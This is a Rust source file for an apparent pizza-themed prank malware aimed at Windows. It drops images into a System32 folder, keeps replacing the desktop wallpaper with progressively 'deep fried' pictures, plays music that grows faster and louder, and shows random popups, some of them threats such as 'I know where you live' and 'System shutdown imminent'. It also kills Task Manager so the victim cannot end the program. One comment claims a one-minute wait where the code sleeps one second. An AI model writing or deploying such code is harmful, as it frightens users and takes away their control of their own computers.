use std::{
    path::Path,
    collections::HashMap
};
use std::thread;
use std::time::Duration;

mod wallpaper;
mod play_music;
mod utils;
mod popups;
mod kill_process;

fn main() {
    let iterations: usize = 240;

    let mut images: HashMap<&str, &str> = HashMap::new();
    let chef_path = "C:\\Windows\\System32\\spool\\drivers\\color\\chef.jpeg";
    let pizza1_path = "C:\\Windows\\System32\\spool\\drivers\\color\\pizza1.png";
    let pizza2_path = "C:\\Windows\\System32\\spool\\drivers\\color\\pizza2.png";

    images.insert(chef_path, "CHEF_IMAGE");
    images.insert(pizza1_path, "PIZZA1_IMAGE");
    images.insert(pizza2_path, "PIZZA2_IMAGE");

    for (filepath, resource_id) in &images {
        /* Extract image from PE to filesystem */
        wallpaper::extract_image_to_filesystem(
            resource_id,
            &Path::new(filepath)
        );
    }

    wallpaper::set_wallpaper(pizza1_path);

    let image_paths: Vec<String> = images.keys()
    .map(|key| key.to_string()) 
    .collect();

    thread::spawn(move || {
        /* Names of processes to look for and kill */
        let target_processes = &[
            "Taskmgr.exe"
        ];
    
        kill_process::kill_processes(target_processes)
    });

    thread::spawn(move || {
        let messages = vec![
            "Warning: Nick needs a pizza".to_string(),
            "Nick is hungry".to_string(),
            "Dominos > Papa Johns".to_string(),
            "I know where you live".to_string(),
            "No pizza = System shutdown imminent".to_string(),
        ];

        popups::popup_messages_randomly(messages, iterations, 3000, 10000);
    });

    thread::spawn(move || {
        popups::popup_images_randomly(image_paths, iterations, 3000, 10000);
    });

    /* Play annoying music with increasing speed and crescendo */
    thread::spawn(move || {
        play_music::play_embedded_mp3_with_increasing_speed_volume(iterations, 0.1, 0.2);
    });

    /* load the image for deep frying */
    let mut img = image::open(&chef_path).expect("Error: failed to load image!");

    /* deep fry loop */
    let mut intensity = 0.0;
    let max_intensity = 1.0;
    let steps = 60;

    for i in 1..=steps {
        println!("entering loop");
        /* calculate current intensity based on current iteration */
        intensity = (i as f32) / (steps as f32) * max_intensity;

        /* create deep fried version */
        let deep_fried = wallpaper::deep_fry(&img, intensity);

        deep_fried.save(&chef_path).expect("Error: failed to save deep fried image!");

        /* set new wallpaper */
        wallpaper::set_wallpaper(&chef_path);

        /* wait for 1 minute before continuing deep fry loop */
        thread::sleep(Duration::from_secs(1));
    }
}

